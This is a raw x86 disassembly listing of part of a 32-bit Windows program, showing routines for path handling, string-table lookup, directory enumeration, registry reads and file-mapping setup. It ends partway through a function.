  40a22c:	lea    edx,[ecx+0x2]
  40a22f:	mov    ax,WORD PTR [ecx]
  40a232:	add    ecx,0x2
  40a235:	cmp    ax,bx
  40a238:	jne    0x40a22f
  40a23a:	sub    ecx,edx
  40a23c:	sar    ecx,1
  40a23e:	push   0x5c
  40a240:	movzx  eax,WORD PTR [edi+ecx*2-0x2]
  40a245:	pop    edx
  40a246:	cmp    dx,ax
  40a249:	je     0x40a253
  40a24b:	push   0x2f
  40a24d:	pop    edx
  40a24e:	cmp    dx,ax
  40a251:	jne    0x40a25a
  40a253:	xor    eax,eax
  40a255:	mov    WORD PTR [edi+ecx*2-0x2],ax
  40a25a:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25d:	mov    eax,edi
  40a25f:	pop    edi
  40a260:	pop    esi
  40a261:	xor    ecx,ebp
  40a263:	pop    ebx
  40a264:	call   0x40fd0b
  40a269:	leave  
  40a26a:	ret    
  40a26b:	push   esi
  40a26c:	mov    esi,ecx
  40a26e:	push   edi
  40a26f:	movzx  eax,WORD PTR [esi]
  40a272:	mov    edx,esi
  40a274:	test   ax,ax
  40a277:	je     0x40a2ec
  40a279:	xor    ecx,ecx
  40a27b:	movzx  eax,ax
  40a27e:	lea    edx,[edx+0x2]
  40a281:	add    ecx,eax
  40a283:	movzx  eax,WORD PTR [edx]
  40a286:	test   ax,ax
  40a289:	jne    0x40a27b
  40a28b:	movzx  eax,cl
  40a28e:	lea    eax,[eax*4+0x431f40]
  40a295:	mov    ds:0x43242c,eax
  40a29a:	mov    ecx,DWORD PTR [eax]
  40a29c:	jmp    0x40a2d4
  40a29e:	mov    eax,DWORD PTR [ecx+0x4]
  40a2a1:	mov    edx,esi
  40a2a3:	mov    di,WORD PTR [eax]
  40a2a6:	cmp    di,WORD PTR [edx]
  40a2a9:	jne    0x40a2c9
  40a2ab:	test   di,di
  40a2ae:	je     0x40a2c5
  40a2b0:	mov    di,WORD PTR [eax+0x2]
  40a2b4:	cmp    di,WORD PTR [edx+0x2]
  40a2b8:	jne    0x40a2c9
  40a2ba:	add    eax,0x4
  40a2bd:	add    edx,0x4
  40a2c0:	test   di,di
  40a2c3:	jne    0x40a2a3
  40a2c5:	xor    eax,eax
  40a2c7:	jmp    0x40a2ce
  40a2c9:	sbb    eax,eax
  40a2cb:	or     eax,0x1
  40a2ce:	test   eax,eax
  40a2d0:	je     0x40a2da
  40a2d2:	mov    ecx,DWORD PTR [ecx]
  40a2d4:	test   ecx,ecx
  40a2d6:	jne    0x40a29e
  40a2d8:	jmp    0x40a2f6
  40a2da:	mov    al,BYTE PTR [ecx+0xc]
  40a2dd:	and    al,0x10
  40a2df:	movzx  eax,al
  40a2e2:	neg    eax
  40a2e4:	sbb    eax,eax
  40a2e6:	not    eax
  40a2e8:	and    eax,ecx
  40a2ea:	jmp    0x40a2f8
  40a2ec:	mov    DWORD PTR ds:0x43242c,0x431f40
  40a2f6:	xor    eax,eax
  40a2f8:	pop    edi
  40a2f9:	pop    esi
  40a2fa:	ret    
  40a2fb:	push   esi
  40a2fc:	push   ecx
  40a2fd:	call   DWORD PTR ds:0x4373e8
  40a303:	mov    esi,eax
  40a305:	pop    ecx
  40a306:	test   esi,esi
  40a308:	jne    0x40a31c
  40a30a:	push   0x41b
  40a30f:	push   DWORD PTR ds:0x4216e0
  40a315:	call   0x405021
  40a31a:	pop    ecx
  40a31b:	pop    ecx
  40a31c:	mov    eax,esi
  40a31e:	pop    esi
  40a31f:	ret    
  40a320:	push   ecx
  40a321:	push   esi
  40a322:	push   edi
  40a323:	mov    esi,ecx
  40a325:	call   0x40a2fb
  40a32a:	push   esi
  40a32b:	mov    edi,eax
  40a32d:	push   0x0
  40a32f:	push   edi
  40a330:	call   0x410482
  40a335:	add    esp,0xc
  40a338:	mov    eax,edi
  40a33a:	pop    edi
  40a33b:	pop    esi
  40a33c:	pop    ecx
  40a33d:	ret    
  40a33e:	push   esi
  40a33f:	test   ecx,ecx
  40a341:	je     0x40a367
  40a343:	push   edx
  40a344:	push   ecx
  40a345:	call   DWORD PTR ds:0x4373e4
  40a34b:	mov    esi,eax
  40a34d:	pop    ecx
  40a34e:	pop    ecx
  40a34f:	test   esi,esi
  40a351:	jne    0x40a370
  40a353:	push   0x41b
  40a358:	push   DWORD PTR ds:0x4216e0
  40a35e:	call   0x405021
  40a363:	pop    ecx
  40a364:	pop    ecx
  40a365:	jmp    0x40a370
  40a367:	mov    ecx,edx
  40a369:	call   0x40a2fb
  40a36e:	mov    esi,eax
  40a370:	mov    eax,esi
  40a372:	pop    esi
  40a373:	ret    
  40a374:	push   ebp
  40a375:	mov    ebp,esp
  40a377:	and    esp,0xfffffff8
  40a37a:	sub    esp,0x6bc
  40a380:	mov    eax,ds:0x411018
  40a385:	xor    eax,esp
  40a387:	mov    DWORD PTR [esp+0x6b8],eax
  40a38e:	push   ebx
  40a38f:	xor    ebx,ebx
  40a391:	push   esi
  40a392:	push   edi
  40a393:	mov    DWORD PTR [esp+0x28],edx
  40a397:	mov    DWORD PTR [esp+0x24],0x4362f4
  40a39f:	mov    DWORD PTR [esp+0x20],ebx
  40a3a3:	mov    DWORD PTR [esp+0x18],ebx
  40a3a7:	mov    DWORD PTR [esp+0x1c],0x4362f0
  40a3af:	mov    DWORD PTR [esp+0x30],0x60
  40a3b7:	test   ecx,ecx
  40a3b9:	je     0x40a822
  40a3bf:	cmp    WORD PTR [ecx],bx
  40a3c2:	je     0x40a822
  40a3c8:	test   edx,edx
  40a3ca:	je     0x40a822
  40a3d0:	cmp    WORD PTR [edx],bx
  40a3d3:	je     0x40a822
  40a3d9:	push   0xffffffff
  40a3db:	push   ecx
  40a3dc:	mov    esi,0x104
  40a3e1:	lea    eax,[esp+0x4c0]
  40a3e8:	push   esi
  40a3e9:	push   eax
  40a3ea:	mov    DWORD PTR ds:0x4362f0,ebx
  40a3f0:	call   DWORD PTR ds:0x43746c
  40a3f6:	add    esp,0x10
  40a3f9:	test   eax,eax
  40a3fb:	je     0x40a407
  40a3fd:	mov    eax,0x80004005
  40a402:	jmp    0x40a827
  40a407:	lea    ecx,[esp+0x4b8]
  40a40e:	lea    edx,[ecx+0x2]
  40a411:	mov    ax,WORD PTR [ecx]
  40a414:	add    ecx,0x2
  40a417:	cmp    ax,bx
  40a41a:	jne    0x40a411
  40a41c:	sub    ecx,edx
  40a41e:	sar    ecx,1
  40a420:	cmp    WORD PTR [esp+ecx*2+0x4b6],0x5c
  40a429:	je     0x40a448
  40a42b:	push   0xffffffff
  40a42d:	push   0x40194c
  40a432:	lea    eax,[esp+0x4c0]
  40a439:	push   esi
  40a43a:	push   eax
  40a43b:	call   DWORD PTR ds:0x43747c
  40a441:	add    esp,0x10
  40a444:	test   eax,eax
  40a446:	jne    0x40a3fd
  40a448:	lea    eax,[esp+0x4b8]
  40a44f:	mov    DWORD PTR [esp+0x34],eax
  40a453:	lea    eax,[esp+0x28]
  40a457:	mov    DWORD PTR [esp+0x38],eax
  40a45b:	lea    eax,[esp+0x30]
  40a45f:	mov    DWORD PTR [esp+0x3c],eax
  40a463:	mov    esi,DWORD PTR ds:0x43732c
  40a469:	lea    eax,[esp+0x1c]
  40a46d:	mov    DWORD PTR [esp+0x40],eax
  40a471:	lea    eax,[esp+0x24]
  40a475:	mov    DWORD PTR [esp+0x44],eax
  40a479:	lea    eax,[esp+0x18]
  40a47d:	mov    DWORD PTR [esp+0x48],eax
  40a481:	lea    eax,[esp+0x20]
  40a485:	mov    DWORD PTR [esp+0x4c],eax
  40a489:	xor    eax,eax
  40a48b:	mov    WORD PTR [esp+0x2a4],ax
  40a493:	lea    edi,[esp+0x2a6]
  40a49a:	stos   DWORD PTR es:[edi],eax
  40a49b:	stos   DWORD PTR es:[edi],eax
  40a49c:	stos   WORD PTR es:[edi],ax
  40a49e:	push   0x6
  40a4a0:	lea    eax,[esp+0x2a8]
  40a4a7:	push   eax
  40a4a8:	mov    ebx,0x80070002
  40a4ad:	push   0x40196c
  40a4b2:	mov    DWORD PTR [esp+0x18],ebx
  40a4b6:	call   esi
  40a4b8:	test   eax,eax
  40a4ba:	je     0x40a4e8
  40a4bc:	cmp    eax,0x6
  40a4bf:	jae    0x40a4e8
  40a4c1:	lea    eax,[esp+0xc]
  40a4c5:	push   eax
  40a4c6:	push   0xa
  40a4c8:	lea    eax,[esp+0x2ac]
  40a4cf:	push   eax
  40a4d0:	lea    ecx,[esp+0x40]
  40a4d4:	call   0x40a844
  40a4d9:	mov    ebx,DWORD PTR [esp+0xc]
  40a4dd:	test   ebx,ebx
  40a4df:	jne    0x40a4e8
  40a4e1:	xor    eax,eax
  40a4e3:	jmp    0x40a827
  40a4e8:	xor    edi,edi
  40a4ea:	push   edi
  40a4eb:	push   edi
  40a4ec:	push   0x40197c
  40a4f1:	call   esi
  40a4f3:	test   eax,eax
  40a4f5:	jne    0x40a50c
  40a4f7:	push   edi
  40a4f8:	push   edi
  40a4f9:	push   0x100
  40a4fe:	call   DWORD PTR ds:0x437330
  40a504:	test   eax,eax
  40a506:	je     0x40a3fd
  40a50c:	lea    eax,[esp+0x10]
  40a510:	push   eax
  40a511:	push   edi
  40a512:	lea    eax,[esp+0x34]
  40a516:	push   eax
  40a517:	mov    DWORD PTR [esp+0x1c],edi
  40a51b:	mov    DWORD PTR [esp+0x38],edi
  40a51f:	mov    edi,DWORD PTR ds:0x437334
  40a525:	push   0x34
  40a527:	call   edi
  40a529:	test   eax,eax
  40a52b:	je     0x40a3fd
  40a531:	mov    eax,DWORD PTR [esp+0x10]
  40a535:	add    eax,eax
  40a537:	push   eax
  40a538:	xor    edx,edx
  40a53a:	push   edx
  40a53b:	call   DWORD PTR ds:0x43733c
  40a541:	push   eax
  40a542:	call   DWORD PTR ds:0x437338
  40a548:	mov    esi,eax
  40a54a:	mov    DWORD PTR [esp+0x14],esi
  40a54e:	test   esi,esi
  40a550:	jne    0x40a55c
  40a552:	mov    eax,0x8007000e
  40a557:	jmp    0x40a827
  40a55c:	lea    eax,[esp+0x10]
  40a560:	push   eax
  40a561:	push   esi
  40a562:	lea    eax,[esp+0x34]
  40a566:	push   eax
  40a567:	push   0x34
  40a569:	call   edi
  40a56b:	test   eax,eax
  40a56d:	je     0x40a3fd
  40a573:	xor    eax,eax
  40a575:	mov    edi,esi
  40a577:	cmp    WORD PTR [esi],ax
  40a57a:	je     0x40a5a5
  40a57c:	xor    esi,esi
  40a57e:	lea    eax,[esp+0xc]
  40a582:	push   eax
  40a583:	push   0x10
  40a585:	push   edi
  40a586:	lea    ecx,[esp+0x40]
  40a58a:	call   0x40a844
  40a58f:	mov    ebx,DWORD PTR [esp+0xc]
  40a593:	test   ebx,ebx
  40a595:	je     0x40a59f
  40a597:	add    edi,0xa
  40a59a:	cmp    WORD PTR [edi],si
  40a59d:	jne    0x40a57e
  40a59f:	mov    esi,DWORD PTR [esp+0x14]
  40a5a3:	xor    eax,eax
  40a5a5:	push   esi
  40a5a6:	push   eax
  40a5a7:	call   DWORD PTR ds:0x43733c
  40a5ad:	push   eax
  40a5ae:	call   DWORD PTR ds:0x437340
  40a5b4:	test   ebx,ebx
  40a5b6:	je     0x40a4e1
  40a5bc:	lea    eax,[esp+0xc]
  40a5c0:	push   eax
  40a5c1:	push   0xa
  40a5c3:	push   0x4019a0
  40a5c8:	lea    ecx,[esp+0x40]
  40a5cc:	call   0x40a844
  40a5d1:	mov    ebx,DWORD PTR [esp+0xc]
  40a5d5:	test   ebx,ebx
  40a5d7:	je     0x40a4e1
  40a5dd:	push   0xffffffff
  40a5df:	lea    eax,[esp+0x4bc]
  40a5e6:	push   eax
  40a5e7:	mov    esi,0x104
  40a5ec:	lea    eax,[esp+0x2b8]
  40a5f3:	push   esi
  40a5f4:	push   eax
  40a5f5:	call   DWORD PTR ds:0x43746c
  40a5fb:	add    esp,0x10
  40a5fe:	test   eax,eax
  40a600:	jne    0x40a81b
  40a606:	push   0xffffffff
  40a608:	push   0x4019ac
  40a60d:	lea    eax,[esp+0x2b8]
  40a614:	push   esi
  40a615:	push   eax
  40a616:	call   DWORD PTR ds:0x43747c
  40a61c:	add    esp,0x10
  40a61f:	test   eax,eax
  40a621:	jne    0x40a81b
  40a627:	lea    eax,[esp+0x50]
  40a62b:	push   eax
  40a62c:	lea    eax,[esp+0x2b4]
  40a633:	push   eax
  40a634:	call   DWORD PTR ds:0x437314
  40a63a:	mov    edi,eax
  40a63c:	cmp    edi,0xffffffff
  40a63f:	jne    0x40a65c
  40a641:	call   DWORD PTR ds:0x437344
  40a647:	test   eax,eax
  40a649:	jle    0x40a827
  40a64f:	movzx  eax,ax
  40a652:	or     eax,0x80070000
  40a657:	jmp    0x40a827
  40a65c:	lea    esi,[esp+0x4b8]
  40a663:	xor    edx,edx
  40a665:	lea    ecx,[esi+0x2]
  40a668:	mov    ax,WORD PTR [esi]
  40a66b:	add    esi,0x2
  40a66e:	cmp    ax,dx
  40a671:	jne    0x40a668
  40a673:	sub    esi,ecx
  40a675:	sar    esi,1
  40a677:	jmp    0x40a7c0
  40a67c:	test   BYTE PTR [esp+0x50],0x10
  40a681:	je     0x40a7c0
  40a687:	mov    ecx,0x401914
  40a68c:	lea    eax,[esp+0x7c]
  40a690:	mov    dx,WORD PTR [eax]
  40a693:	cmp    dx,WORD PTR [ecx]
  40a696:	jne    0x40a6b6
  40a698:	test   dx,dx
  40a69b:	je     0x40a6b2
  40a69d:	mov    dx,WORD PTR [eax+0x2]
  40a6a1:	cmp    dx,WORD PTR [ecx+0x2]
  40a6a5:	jne    0x40a6b6
  40a6a7:	add    eax,0x4
  40a6aa:	add    ecx,0x4
  40a6ad:	test   dx,dx
  40a6b0:	jne    0x40a690
  40a6b2:	xor    eax,eax
  40a6b4:	jmp    0x40a6bb
  40a6b6:	sbb    eax,eax
  40a6b8:	or     eax,0x1
  40a6bb:	test   eax,eax
  40a6bd:	je     0x40a7c0
  40a6c3:	mov    ecx,0x4019b0
  40a6c8:	lea    eax,[esp+0x7c]
  40a6cc:	mov    dx,WORD PTR [eax]
  40a6cf:	cmp    dx,WORD PTR [ecx]
  40a6d2:	jne    0x40a6f2
  40a6d4:	test   dx,dx
  40a6d7:	je     0x40a6ee
  40a6d9:	mov    dx,WORD PTR [eax+0x2]
  40a6dd:	cmp    dx,WORD PTR [ecx+0x2]
  40a6e1:	jne    0x40a6f2
  40a6e3:	add    eax,0x4
  40a6e6:	add    ecx,0x4
  40a6e9:	test   dx,dx
  40a6ec:	jne    0x40a6cc
  40a6ee:	xor    eax,eax
  40a6f0:	jmp    0x40a6f7
  40a6f2:	sbb    eax,eax
  40a6f4:	or     eax,0x1
  40a6f7:	test   eax,eax
  40a6f9:	je     0x40a7c0
  40a6ff:	push   0x1
  40a701:	lea    eax,[esp+0x10]
  40a705:	push   eax
  40a706:	lea    eax,[esp+0x1c]
  40a70a:	push   eax
  40a70b:	lea    eax,[esp+0x88]
  40a712:	push   0x4019b8
  40a717:	push   eax
  40a718:	call   DWORD PTR ds:0x437480
  40a71e:	add    esp,0x14
  40a721:	cmp    eax,0xffffffff
  40a724:	je     0x40a7c0
  40a72a:	lea    eax,[esi+esi*1]
  40a72d:	cmp    eax,0x208
  40a732:	jae    0x40a83e
  40a738:	xor    ecx,ecx
  40a73a:	mov    WORD PTR [esp+eax*1+0x2b0],cx
  40a742:	push   0xffffffff
  40a744:	lea    eax,[esp+0x80]
  40a74b:	push   eax
  40a74c:	lea    eax,[esp+0x2b8]
  40a753:	push   0x104
  40a758:	push   eax
  40a759:	call   DWORD PTR ds:0x43747c
  40a75f:	add    esp,0x10
  40a762:	test   eax,eax
  40a764:	jne    0x40a7c0
  40a766:	push   0xffffffff
  40a768:	push   0x40194c
  40a76d:	lea    eax,[esp+0x2b8]
  40a774:	push   0x104
  40a779:	push   eax
  40a77a:	call   DWORD PTR ds:0x43747c
  40a780:	add    esp,0x10
  40a783:	test   eax,eax
  40a785:	jne    0x40a7c0
  40a787:	push   0xffffffff
  40a789:	push   DWORD PTR [esp+0x2c]
  40a78d:	lea    eax,[esp+0x2b8]
  40a794:	push   0x104
  40a799:	push   eax
  40a79a:	call   DWORD PTR ds:0x43747c
  40a7a0:	add    esp,0x10
  40a7a3:	test   eax,eax
  40a7a5:	jne    0x40a7c0
  40a7a7:	push   DWORD PTR [esp+0x30]
  40a7ab:	push   eax
  40a7ac:	lea    eax,[esp+0x2b8]
  40a7b3:	push   eax
  40a7b4:	call   DWORD PTR ds:0x437348
  40a7ba:	mov    ecx,eax
  40a7bc:	test   ecx,ecx
  40a7be:	jne    0x40a7df
  40a7c0:	lea    eax,[esp+0x50]
  40a7c4:	push   eax
  40a7c5:	push   edi
  40a7c6:	call   DWORD PTR ds:0x43731c
  40a7cc:	test   eax,eax
  40a7ce:	jne    0x40a67c
  40a7d4:	push   edi
  40a7d5:	call   DWORD PTR ds:0x437318
  40a7db:	mov    eax,ebx
  40a7dd:	jmp    0x40a827
  40a7df:	mov    eax,DWORD PTR [esp+0x1c]
  40a7e3:	mov    DWORD PTR [eax],ecx
  40a7e5:	mov    ecx,DWORD PTR [esp+0x24]
  40a7e9:	test   ecx,ecx
  40a7eb:	je     0x40a7f5
  40a7ed:	mov    ax,WORD PTR [esp+0x14]
  40a7f2:	mov    WORD PTR [ecx],ax
  40a7f5:	cmp    DWORD PTR [esp+0x18],0x0
  40a7fa:	je     0x40a815
  40a7fc:	lea    eax,[esp+0x2b0]
  40a803:	push   eax
  40a804:	push   DWORD PTR [esp+0x24]
  40a808:	push   DWORD PTR [esp+0x20]
  40a80c:	call   DWORD PTR ds:0x4373d0
  40a812:	add    esp,0xc
  40a815:	xor    eax,eax
  40a817:	mov    ebx,eax
  40a819:	jmp    0x40a7d4
  40a81b:	mov    eax,0x80070003
  40a820:	jmp    0x40a827
  40a822:	mov    eax,0x80070057
  40a827:	mov    ecx,DWORD PTR [esp+0x6c4]
  40a82e:	pop    edi
  40a82f:	pop    esi
  40a830:	pop    ebx
  40a831:	xor    ecx,esp
  40a833:	call   0x40fd0b
  40a838:	mov    esp,ebp
  40a83a:	pop    ebp
  40a83b:	ret    0x18
  40a83e:	call   0x40fe50
  40a843:	int3   
  40a844:	push   ebp
  40a845:	mov    ebp,esp
  40a847:	sub    esp,0x220
  40a84d:	mov    eax,ds:0x411018
  40a852:	xor    eax,ebp
  40a854:	mov    DWORD PTR [ebp-0x4],eax
  40a857:	mov    eax,DWORD PTR [ebp+0x8]
  40a85a:	push   ebx
  40a85b:	push   esi
  40a85c:	xor    ebx,ebx
  40a85e:	push   edi
  40a85f:	mov    edi,DWORD PTR [ebp+0x10]
  40a862:	mov    esi,ecx
  40a864:	cmp    WORD PTR [eax],bx
  40a867:	je     0x40a998
  40a86d:	push   DWORD PTR [ebp+0xc]
  40a870:	lea    ecx,[ebp-0x220]
  40a876:	push   ecx
  40a877:	push   eax
  40a878:	call   DWORD PTR ds:0x4373f8
  40a87e:	mov    ecx,DWORD PTR [ebp-0x220]
  40a884:	add    esp,0xc
  40a887:	mov    DWORD PTR [ebp-0x21c],eax
  40a88d:	cmp    WORD PTR [ecx],bx
  40a890:	jne    0x40a998
  40a896:	push   0xa
  40a898:	push   0x6
  40a89a:	lea    ecx,[ebp-0x10]
  40a89d:	push   ecx
  40a89e:	movzx  ecx,ax
  40a8a1:	push   ecx
  40a8a2:	call   DWORD PTR ds:0x437484
  40a8a8:	push   0xffffffff
  40a8aa:	push   DWORD PTR [esi]
  40a8ac:	mov    ebx,0x104
  40a8b1:	lea    eax,[ebp-0x218]
  40a8b7:	push   ebx
  40a8b8:	push   eax
  40a8b9:	call   DWORD PTR ds:0x43746c
  40a8bf:	add    esp,0x20
  40a8c2:	test   eax,eax
  40a8c4:	jne    0x40a998
  40a8ca:	push   0xffffffff
  40a8cc:	lea    eax,[ebp-0x10]
  40a8cf:	push   eax
  40a8d0:	push   ebx
  40a8d1:	mov    ebx,DWORD PTR ds:0x43747c
  40a8d7:	lea    eax,[ebp-0x218]
  40a8dd:	push   eax
  40a8de:	call   ebx
  40a8e0:	add    esp,0x10
  40a8e3:	test   eax,eax
  40a8e5:	jne    0x40a998
  40a8eb:	push   0xffffffff
  40a8ed:	push   0x40194c
  40a8f2:	lea    eax,[ebp-0x218]
  40a8f8:	push   0x104
  40a8fd:	push   eax
  40a8fe:	call   ebx
  40a900:	add    esp,0x10
  40a903:	test   eax,eax
  40a905:	jne    0x40a998
  40a90b:	mov    eax,DWORD PTR [esi+0x4]
  40a90e:	push   0xffffffff
  40a910:	push   DWORD PTR [eax]
  40a912:	lea    eax,[ebp-0x218]
  40a918:	push   0x104
  40a91d:	push   eax
  40a91e:	call   ebx
  40a920:	add    esp,0x10
  40a923:	test   eax,eax
  40a925:	jne    0x40a998
  40a927:	mov    eax,DWORD PTR [esi+0x8]
  40a92a:	push   DWORD PTR [eax]
  40a92c:	lea    eax,[ebp-0x218]
  40a932:	push   0x0
  40a934:	push   eax
  40a935:	call   DWORD PTR ds:0x437348
  40a93b:	test   eax,eax
  40a93d:	je     0x40a97c
  40a93f:	mov    ecx,DWORD PTR [esi+0xc]
  40a942:	mov    ecx,DWORD PTR [ecx]
  40a944:	mov    DWORD PTR [ecx],eax
  40a946:	mov    eax,DWORD PTR [esi+0x10]
  40a949:	mov    eax,DWORD PTR [eax]
  40a94b:	test   eax,eax
  40a94d:	je     0x40a958
  40a94f:	mov    ecx,DWORD PTR [ebp-0x21c]
  40a955:	mov    WORD PTR [eax],cx
  40a958:	mov    eax,DWORD PTR [esi+0x14]
  40a95b:	mov    ecx,DWORD PTR [eax]
  40a95d:	test   ecx,ecx
  40a95f:	je     0x40a977
  40a961:	lea    eax,[ebp-0x218]
  40a967:	push   eax
  40a968:	mov    eax,DWORD PTR [esi+0x18]
  40a96b:	push   DWORD PTR [eax]
  40a96d:	push   ecx
  40a96e:	call   DWORD PTR ds:0x4373d0
  40a974:	add    esp,0xc
  40a977:	and    DWORD PTR [edi],0x0
  40a97a:	jmp    0x40a998
  40a97c:	cmp    DWORD PTR [edi],0x80070002
  40a982:	jne    0x40a998
  40a984:	call   DWORD PTR ds:0x437344
  40a98a:	test   eax,eax
  40a98c:	jle    0x40a996
  40a98e:	movzx  eax,ax
  40a991:	or     eax,0x80070000
  40a996:	mov    DWORD PTR [edi],eax
  40a998:	mov    ecx,DWORD PTR [ebp-0x4]
  40a99b:	pop    edi
  40a99c:	pop    esi
  40a99d:	xor    ecx,ebp
  40a99f:	pop    ebx
  40a9a0:	call   0x40fd0b
  40a9a5:	leave  
  40a9a6:	ret    0xc
  40a9a9:	ret    
  40a9aa:	mov    eax,ds:0x432640
  40a9af:	test   eax,eax
  40a9b1:	jle    0x40a9cf
  40a9b3:	cmp    eax,0x2
  40a9b6:	jle    0x40a9cc
  40a9b8:	cmp    eax,0x3
  40a9bb:	jne    0x40a9cf
  40a9bd:	call   0x40a9d2
  40a9c2:	xor    ecx,ecx
  40a9c4:	test   al,al
  40a9c6:	sete   cl
  40a9c9:	mov    al,cl
  40a9cb:	ret    
  40a9cc:	xor    al,al
  40a9ce:	ret    
  40a9cf:	mov    al,0x1
  40a9d1:	ret    
  40a9d2:	push   ebp
  40a9d3:	mov    ebp,esp
  40a9d5:	sub    esp,0x10
  40a9d8:	call   DWORD PTR ds:0x43734c
  40a9de:	cmp    al,0x6
  40a9e0:	jb     0x40a9e6
  40a9e2:	mov    al,0x1
  40a9e4:	leave  
  40a9e5:	ret    
  40a9e6:	push   edi
  40a9e7:	lea    eax,[ebp-0x4]
  40a9ea:	push   eax
  40a9eb:	push   0x20019
  40a9f0:	push   0x0
  40a9f2:	push   0x401ca8
  40a9f7:	push   0x80000001
  40a9fc:	call   DWORD PTR ds:0x4372e0
  40aa02:	test   eax,eax
  40aa04:	jne    0x40aa4e
  40aa06:	push   esi
  40aa07:	push   0x4
  40aa09:	pop    edi
  40aa0a:	lea    eax,[ebp-0x8]
  40aa0d:	push   eax
  40aa0e:	lea    eax,[ebp-0x10]
  40aa11:	push   eax
  40aa12:	lea    eax,[ebp-0xc]
  40aa15:	push   eax
  40aa16:	push   0x0
  40aa18:	push   0x401d00
  40aa1d:	push   DWORD PTR [ebp-0x4]
  40aa20:	mov    DWORD PTR [ebp-0x8],edi
  40aa23:	call   DWORD PTR ds:0x4372d8
  40aa29:	push   DWORD PTR [ebp-0x4]
  40aa2c:	mov    esi,eax
  40aa2e:	call   DWORD PTR ds:0x4372dc
  40aa34:	test   esi,esi
  40aa36:	pop    esi
  40aa37:	jne    0x40aa4e
  40aa39:	cmp    DWORD PTR [ebp-0xc],edi
  40aa3c:	jne    0x40aa4e
  40aa3e:	cmp    DWORD PTR [ebp-0x8],edi
  40aa41:	jne    0x40aa4e
  40aa43:	xor    eax,eax
  40aa45:	cmp    DWORD PTR [ebp-0x10],0x1
  40aa49:	sete   al
  40aa4c:	jmp    0x40aa50
  40aa4e:	xor    al,al
  40aa50:	pop    edi
  40aa51:	leave  
  40aa52:	ret    
  40aa53:	push   ebp
  40aa54:	mov    ebp,esp
  40aa56:	sub    esp,0xc
  40aa59:	xor    eax,eax
  40aa5b:	push   esi
  40aa5c:	push   edi
  40aa5d:	mov    edi,0x435e88
  40aa62:	cmp    eax,edi
  40aa64:	je     0x40aad8
  40aa66:	lea    eax,[ebp-0x4]
  40aa69:	push   eax
  40aa6a:	push   0x20019
  40aa6f:	push   0x0
  40aa71:	push   0x401d38
  40aa76:	push   0x80000002
  40aa7b:	call   DWORD PTR ds:0x4372e0
  40aa81:	test   eax,eax
  40aa83:	jne    0x40aad8
  40aa85:	lea    eax,[ebp-0xc]
  40aa88:	push   eax
  40aa89:	push   edi
  40aa8a:	lea    eax,[ebp-0x8]
  40aa8d:	push   eax
  40aa8e:	push   0x0
  40aa90:	push   0x401da8
  40aa95:	push   DWORD PTR [ebp-0x4]
  40aa98:	mov    DWORD PTR [ebp-0xc],0x208
  40aa9f:	call   DWORD PTR ds:0x4372d8
  40aaa5:	push   DWORD PTR [ebp-0x4]
  40aaa8:	mov    esi,eax
  40aaaa:	call   DWORD PTR ds:0x4372dc
  40aab0:	xor    eax,eax
  40aab2:	mov    ds:0x43608e,ax
  40aab8:	test   esi,esi
  40aaba:	jne    0x40aad8
  40aabc:	cmp    DWORD PTR [ebp-0x8],0x2
  40aac0:	jne    0x40aade
  40aac2:	mov    esi,0x104
  40aac7:	push   esi
  40aac8:	push   edi
  40aac9:	push   edi
  40aaca:	call   DWORD PTR ds:0x437350
  40aad0:	cmp    eax,esi
  40aad2:	ja     0x40aad8
  40aad4:	test   eax,eax
  40aad6:	jne    0x40aae4
  40aad8:	xor    al,al
  40aada:	pop    edi
  40aadb:	pop    esi
  40aadc:	leave  
  40aadd:	ret    
  40aade:	cmp    DWORD PTR [ebp-0x8],0x1
  40aae2:	jne    0x40aad8
  40aae4:	mov    al,0x1
  40aae6:	jmp    0x40aada
  40aae8:	push   esi
  40aae9:	xor    esi,esi
  40aaeb:	push   esi
  40aaec:	push   0x9c9c
  40aaf1:	push   esi
  40aaf2:	push   0x4
  40aaf4:	push   0x435668
  40aaf9:	push   0xffffffff
  40aafb:	call   DWORD PTR ds:0x437354
  40ab01:	mov    ds:0x432638,eax
  40ab06:	test   eax,eax
  40ab08:	jne    0x40ab0e
  40ab0a:	xor    al,al
  40ab0c:	pop    esi
  40ab0d:	ret    
  40ab0e:	push   esi
  40ab0f:	push   esi
  40ab10:	push   esi
  40ab11:	push   0x6
  40ab13:	push   eax
  40ab14:	call   DWORD PTR ds:0x437358
  40ab1a:	mov    ds:0x43263c,eax
  40ab1f:	test   eax,eax
  40ab21:	jne    0x40ab37
  40ab23:	push   DWORD PTR ds:0x432638
  40ab29:	call   DWORD PTR ds:0x437304
  40ab2f:	mov    DWORD PTR ds:0x432638,esi
  40ab35:	jmp    0x40ab0a
  40ab37:	mov    al,0x1
  40ab39:	pop    esi
  40ab3a:	ret    
  40ab3b:	push   ebp
  40ab3c:	mov    ebp,esp
  40ab3e:	sub    esp,0x64
  40ab41:	mov    eax,ds:0x411018
  40ab46:	xor    eax,ebp
  40ab48:	mov    DWORD PTR [ebp-0x4],eax
  40ab4b:	xor    eax,eax
  40ab4d:	push   ebx
  40ab4e:	xor    ebx,ebx
  40ab50:	inc    eax
  40ab51:	mov    DWORD PTR [ebp-0x64],ecx
  40ab54:	mov    DWORD PTR [ebp-0x58],ebx
  40ab57:	mov    DWORD PTR [ebp-0x60],eax
  40ab5a:	cmp    DWORD PTR ds:0x43567c,ebx
  40ab60:	jne    0x40af1e
  40ab66:	call   0x40a9aa
  40ab6b:	test   al,al
  40ab6d:	je     0x40ab77
  40ab6f:	xor    eax,eax
  40ab71:	inc    eax
  40ab72:	jmp    0x40af1e
  40ab77:	push   esi
  40ab78:	xor    esi,esi
  40ab7a:	inc    esi
  40ab7b:	mov    DWORD PTR ds:0x435668,0xc
  40ab85:	mov    DWORD PTR ds:0x43566c,ebx
  40ab8b:	mov    DWORD PTR ds:0x435670,esi
  40ab91:	cmp    DWORD PTR ds:0x43263c,ebx
  40ab97:	jne    0x40aba2
  40ab99:	call   0x40aae8
  40ab9e:	test   al,al
  40aba0:	je     0x40abab
  40aba2:	call   0x40aa53
  40aba7:	test   al,al
  40aba9:	jne    0x40abb2
  40abab:	mov    eax,esi
  40abad:	jmp    0x40af1d
  40abb2:	mov    esi,DWORD PTR ds:0x43735c
  40abb8:	push   edi
  40abb9:	push   ebx
  40abba:	push   ebx
  40abbb:	push   ebx
  40abbc:	mov    edi,0x435668
  40abc1:	push   edi
  40abc2:	call   esi
  40abc4:	push   ebx
  40abc5:	push   ebx
  40abc6:	push   ebx
  40abc7:	push   edi
  40abc8:	mov    ds:0x43567c,eax
  40abcd:	call   esi
